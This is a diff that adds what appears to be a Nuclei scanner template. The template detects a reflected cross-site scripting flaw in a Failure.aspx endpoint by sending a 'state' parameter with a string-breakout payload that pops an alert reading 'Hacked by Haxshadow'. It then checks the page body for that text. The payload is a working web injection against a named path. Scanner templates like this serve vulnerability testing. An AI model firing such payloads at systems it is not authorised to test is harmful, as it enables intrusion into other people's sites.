@@ -1,0 +1,29 @@
+id: failure-asp-xss-haxshadow
+
+info:
+  name: Failure.aspx Reflected XSS via state parameter (Custom Alert)
+  author: haxsahdow
+  severity: high
+  description: |
+    Reflected XSS in Failure.aspx endpoint where the "state" parameter is
+    not sanitized. Injecting a JavaScript payload triggers a browser alert
+    with custom message "Hacked by Haxshadow".
+  tags: xss,reflected,asp
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Mondo/lang/sys/Failure.aspx?state=%22;}alert('Hacked%20by%20Haxshadow');function%20test(){%22"
+
+    matchers:
+      - type: word
+        words:
+          - "Hacked by Haxshadow"
+        part: body
+
+    extractors:
+      - type: regex
+        name: reflected_payload
+        regex:
+          - "state=.*?alert\\('Hacked by Haxshadow'\\)"
+        part: body
